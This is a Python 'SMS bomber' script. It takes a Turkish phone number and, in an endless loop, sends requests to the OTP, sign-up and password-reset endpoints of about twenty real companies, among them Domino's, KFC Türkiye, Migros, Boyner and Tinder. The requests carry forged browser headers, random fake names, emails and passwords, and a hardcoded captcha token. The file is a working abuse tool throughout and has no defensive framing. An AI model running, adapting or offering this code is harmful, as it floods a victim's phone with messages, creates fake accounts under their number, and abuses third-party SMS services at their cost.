import requests
import random
import time
import os
from pystyle import Colors, Colorate

def SmsApi():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        def slow_input(prompt, delay=0.1):
            for char in prompt:
                print(char, end='', flush=True)
                time.sleep(delay)
            return input()
        
        R = '\033[31m'
        G = '\033[32m'
        W = '\033[0m'

        print(Colorate.Vertical(Colors.blue_to_purple,"""
        ░██████╗███╗░░░███╗░█████╗░██╗░░██╗███████╗
        ██╔════╝████╗░████║██╔══██╗██║░██╔╝██╔════╝
        ╚█████╗░██╔████╔██║███████║█████═╝░█████╗░░
        ░╚═══██╗██║╚██╔╝██║██╔══██║██╔═██╗░██╔══╝░░
        ██████╔╝██║░╚═╝░██║██║░░██║██║░╚██╗███████╗
        ╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
        
        """))
        
        telno = slow_input(G+"[+]"+W+"Enter number (example=>5XXXXXXXXX): ")

        print(G+"[+]"+W+"Starting Smake sms spammer")
        time.sleep(2)

        print(G+"[+]"+W+"Press 'Ctrl + C' To Stop")
        print(Colorate.Vertical(Colors.red_to_blue,"***********************************"))
        time.sleep(2)

        numarabaslangıc = "+90"

        Send = G+"[+]"+W+"Send"
        NotSend = R+"[-]"+W+"Not Send"
    except KeyboardInterrupt:
        print(R+"\n[!]"+W+"Keyboard Interrupt!")
        
    def SmsApis():
        while True:
            name = ""
            for _ in range(12):
                name += random.choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
                password = name + random.choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
                email = name + "@gmail.com"
            
            def kahvedünyası():
                kahvedata = {
                    "mobile_number": f"{telno}", 
                    "token_type": "register_token",
                    "Accept": "application/json, text/plain",
                    "Accept-Encoding": "gzip",
                    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Length": "60",
                    "Content-Type": "application/json;charset=UTF-8",
                    "Guest-Token": "",
                    "Host": "core.kahvedunyasi.com",
                    "Origin": "https://www.kahvedunyasi.com",
                    "page-url": "/kayit-ol",
                    "Positive-Client": "kahvedunyasi",
                    "Positive-Client-Type": "web",
                    "Referer": "https://www.kahvedunyasi.com/",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "store-id": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                }
                kahve =requests.post("https://core.kahvedunyasi.com/api/users/sms/send",data=kahvedata)
                if kahve.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            def rusapi():
                rus =requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': numarabaslangıc+telno}, headers={})
                if rus.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            

            def littlecaesars():
                headers ={
                    "name":f"{name}",
                    "email": f"{email}",
                    "password":f"{password}",
                    "facebookId":"null",
                    "genderType":"null",
                    "genderTypeID":"0",
                    "number": f"{telno}",
                    "NameSurname": f"{name}",
                    "Email": f"{email}", 
                    "Phone": f"{telno}", 
                    "Password": f"{password}",
                    "access_token": "",
                    "expires_in": "604800",
                    "login": "true",
                    "refresh_token": "",
                    "token_type": "Bearer",
                    "username": "null"
                }
                data={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Authorization": "",
                    "Connection": "keep-alive",
                    "Content-Length": "162",
                    "Content-Type": "application/json;charset=UTF-8",
                    "Host": "api.littlecaesars.com.tr",
                    "Origin": "https://www.littlecaesars.com.tr",
                    "Referer": "https://www.littlecaesars.com.tr/",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
                }
                r =requests.post("https://api.littlecaesars.com.tr/api/web/Member/Register",json=headers,headers=data)
                if r.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    
            def defacto():
                payload = {
                    "mobilePhone": f"{telno}"
                }
                headers ={
                    "authority": "www.defacto.com.tr",
                    "method": "POST",
                    "path": "/Login/SendGiftClubCustomerConfirmationSms",
                    "scheme": "https",
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-length": "34",
                    "content-type": "application/x-www-form-urlencoded",
                    "cookie": "",
                    "origin": "https://www.defacto.com.tr",
                    "referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2F",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "x-requested-with": "XMLHttpRequest"
                }
                defacto =requests.post("https://www.defacto.com.tr/Login/SendGiftClubCustomerConfirmationSms",data=payload,headers=headers)
                if defacto.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            def DominosPizza():
                payload = {
                    "email": f"{email}", 
                    "mobilePhone": f"{telno}"
                }
                headers = {
                    "authority": "fe.dominos.com.tr",
                    "method": "POST",
                    "path": "/api/customer/sendOtpCode",
                    "scheme": "https",
                    "accept": "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "appversion": "WEB-3.0",
                    "authorization": "",
                    "content-length": "633",
                    "content-type": "application/json;charset=UTF-8",
                    "cookie": "",
                    "origin": "https://www.dominos.com.tr",
                    "referer": "https://www.dominos.com.tr/",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
                }
                Dominos =requests.post("https://fe.dominos.com.tr/api/customer/sendOtpCode",json=payload,headers=headers)
                if Dominos.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    
            def mopas():
                mopas =requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={telno}&pwd=&checkPwd=")
                if mopas.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            def TERRAPIZZA():
                payload = {
                    "handler": "renewpassword",
                    "Phone": f"{telno}",
                    "id": ""
                }
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Length": "16",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Cookie": "",
                    "Host": "www.terrapizza.com.tr",
                    "Origin": "https://www.terrapizza.com.tr",
                    "Referer": "https://www.terrapizza.com.tr/",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }
                terrapızza = requests.post("https://www.terrapizza.com.tr/Customer/Passwords?handler=renewpassword",headers=headers,data=payload)
                if terrapızza.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            def KFC():
                headers={
                    "authority": "kfcturkiye.com",
                    "method": "POST",
                    "path": "/register",
                    "scheme": "https",
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-length": "189",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "cookie": "",
                    "origin": "https://kfcturkiye.com",
                    "referer": "https://kfcturkiye.com/",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "x-requested-with": "XMLHttpRequest"
                }
                payload = {
                    "csrf_token": "",
                    "name": f"{name}",
                    "surname": f"{name}",
                    "email": f"{email}",
                    "tel": f"{telno}",
                    "birth_date": "01/01/1999",
                    "sex": "E",
                    "password": f"{password}",
                    "repassword": f"{password}",
                    "verify": "on"
                }
                kfc =requests.post("https://kfcturkiye.com/register",headers=headers,data=payload)

                if kfc.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    
            def hayatsu():
                payload={
                    "mobilePhoneNumber": f"{telno}"
                }
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Length": "28",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Cookie": "",
                    "Host": "www.hayatsu.com.tr",
                    "Origin": "https://www.hayatsu.com.tr",
                    "Referer": "https://www.hayatsu.com.tr/uye-ol",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }
                hayatsu =requests.post("https://www.hayatsu.com.tr/SignUp/SendOtp",headers=headers,data=payload)
                if hayatsu.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            def istegelsin():
                headers = {
                    "authority": "prod.fasapi.net",
                    "method": "POST",
                    "path": "/",
                    "scheme": "https",
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "app-version": "1",
                    "authorization": "",
                    "content-length": "232",
                    "content-type": "application/json",
                    "origin": "https://www.istegelsin.com",
                    "referer": "https://www.istegelsin.com/",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
                }
                payload = {
                    "query": "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
                    "variables": {"phoneNumber": f"90{telno}"},
                    "data":{"sendOtp2":{"alreadySent":"false","remainingTime":"120"}}
                }
                istegelsin =requests.post("https://prod.fasapi.net/",headers=headers,json=payload)
                if istegelsin.status_code == 200:
                    print(Send)
                    
                else:
                    print(NotSend)
                    

            def migros():
                data ={
                    "data": {"tryAgainEnableInSeconds": "60", "expireInSeconds": "300", "claimId": ""},
                    "reid": "",
                    "phoneNumber": f"{telno}"
                }

                headers ={
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Referer": "https://www.migros.com.tr/hemen/giris",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "X-FORWARDED-REST": "true",
                    "X-PWA": "true"
                }
                
                migros = requests.post("https://www.migros.com.tr/rest/users/login/otp?reid=1674067428082000001",headers=headers,json=data)
                if migros.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)
                    
            def macrocenter():
                headers = {
                    "authority": "www.macrocenter.com.tr",
                    "method": "POST",
                    "path": "/rest/users/v2/register/otp?reid=1674222794696000016",
                    "scheme": "https",
                    "accept": "application/json",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-length": "54",
                    "content-type": "application/json",
                    "cookie": "",
                    "origin": "https://www.macrocenter.com.tr",
                    "referer": "https://www.macrocenter.com.tr/kayit",
                    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                    "x-forwarded-rest": "true",
                    "x-pwa": "true"
                }
                payload = {
                    "email": f"{email}",
                    "phoneNumber": f"{telno}"
                }
                macrocenter=requests.post("https://www.macrocenter.com.tr/rest/users/v2/register/otp?reid=1674222794696000016",headers=headers,json=payload)
                if macrocenter.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)

            def Kıgılı():
                headres ={
                    "authority": "www.kigili.com",
                    "method": "POST",
                    "path": "/users/registration/",
                    "scheme": "https",
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-length": "699",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://www.kigili.com",
                    "referer": "https://www.kigili.com/register/?next=/",
                    "sec-ch-ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Windows",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "x-requested-with": "XMLHttpRequest"
                }
                payload = {
                    "first_name":f"{name}",
                    "last_name":f"{name}",
                    "email":f"{email}",
                    "phone":f"{telno}",
                    "password": f"{password}",
                    "confirm": "true",
                    "kvkk": "true",
                    "next": "/"
                }
                data = {
                    "first_name":f"{name}",
                    "last_name":f"{name}",
                    "email":f"{email}",
                    "email_allowed":"false",
                    "sms_allowed":"false",
                    "call_allowed":"null",
                    "confirm":"true",
                    "user_type":"registered",
                    "phone": f"{telno}",
                    "attributes":{},
                    "resend":"false",
                    "kvkk":"true"
                }
                send =requests.post("https://www.kigili.com/users/registration/",headers=headres,data=payload,json=data)
                if send.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)
            def boyner():
                headers = {
                    'Host': 'www.boyner.com.tr',
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json;charset=UTF-8',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://www.boyner.com.tr',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.boyner.com.tr/uyelik?type=uye-ol&isguestcheckout=false',
                    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                }

                json_data = {
                    'NewPassword': f'{password}',
                    'ConfirmNewPassword': f'{password}',
                    'MembershipAgreement': 'True',
                    'MembershipAgreementClone': 'True',
                    'isGuestQuickBuy': 'false',
                    'ReturnUrl': '',
                    'Captcha': '03AKH6MRFoG8Wz23llBrnnYdnO3XmX5dkw0_xrn2AWslTNLCuuupp316Tn2Zn_IKmCy3w9iB1M_MnNbU4CuzimaStO2dVEbo-ft--xQAI-Fu1d1FFKmUmUlZnynExIwXbCYGRFbb5g-MdD1B15kIzASmpFnXwurl1jPMe2Ki_W0i68tix9esfJWFk57exKgdggYi3peUp-sXfixKNHp0JbBzTVt1h3m9Kb5tfssRQAiupbDya8O1Wm6Q3a3Az79He_1fySLuiZ70slPBdoP6W9t54LjcPUQvWNjItgSPK-y5HQxy-tugYLCTDgBCzgfSaTzJ2pZacG8sNN-F4oKGMyzCQvqlg0_udF6NM97yTQito5ggKSLoVvBkJa1L576TRgoyfmernih8DZ2t8buLDMomhQbMBD57i8D6pivn__i23Yz2inua5-x1N4Vvvzu-l4iBtJiWJwMrnxokTjEqT6KExHsb5Lhfog1qG2YqiYuOHjsxkHj5VXtsgUj4PEym66UZlXKiguHAY8AQ89SqTnVBYes9koUGD3Mg',
                    'CaptchaTurn': 'False',
                    'Main': {
                        'FirstName': f'{name}a',
                        'LastName': f'{name}',
                        'Email': f'{email}',
                        'CellPhone': f'{telno}',
                        'genderid': '1',
                        'day': '10',
                        'month': '09',
                        'year': '1996',
                        'ReceiveCampaignMessages': 'False',
                    },
                }

                response = requests.post('https://www.boyner.com.tr/v2/customerV2/Register',headers=headers, json=json_data)
                if response.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)

            def a101():
                url = "https://www.a101.com.tr:443/users/otp-login/"
                data = {"phone": f"0{telno}", "next": "/a101-kapida"}
                r = requests.post(url,data=data)
                if (r.status_code) == 200:
                    print(Send)
                else:
                    print(NotSend)

            def migros():
                migros = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": telno})
                if migros.json()["successful"] == True:
                    print(Send)
                else:
                    print(NotSend)

            def engilshhome():
                data = {"first_name": f"{name}", "last_name": f"{name}", "email": {email}, "phone": f"0{telno}", "password": f"{password}", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                if home.status_code == 202:
                    print(Send)
                else:
                    print(NotSend)

            def sakasu():
                data = {"phone": telno}
                su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                if su.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)

            def rentiva():
                url = "https://rentiva.com:443/api/Account/Login"
                headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
                json={"appleId": None, "code": "", "email": f"{email}", "facebookId": None, "googleId": None, "lastName": f"{name}", "name": f"{name}", "phone": telno, "type": 1}
                rentiva = requests.post(url, headers=headers, json=json)
                if rentiva.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)

            def bineq():
                url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={telno}"
                headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                bineq = requests.post(url, headers=headers)
                if bineq.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)
            
            def superped():
                url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
                json={"phone_number": f"{numarabaslangıc}{telno}"}
                link = requests.post(url, json=json)
                if link.status_code == 200:
                    print(Send)
                else:
                    print(NotSend)
            
                    
            try:
                boyner()
                kahvedünyası()
                rusapi()
                littlecaesars()
                defacto()
                DominosPizza()
                TERRAPIZZA() 
                KFC()
                hayatsu()
                istegelsin()
                migros()
                macrocenter()
                Kıgılı()
                a101()
                migros()
                engilshhome()
                sakasu()
                rentiva()
                bineq()
                superped()
                
                
            except KeyboardInterrupt:
                print(R+"[!]"+W+"Keyboard Interrupt!")
                break

    SmsApis()
SmsApi()
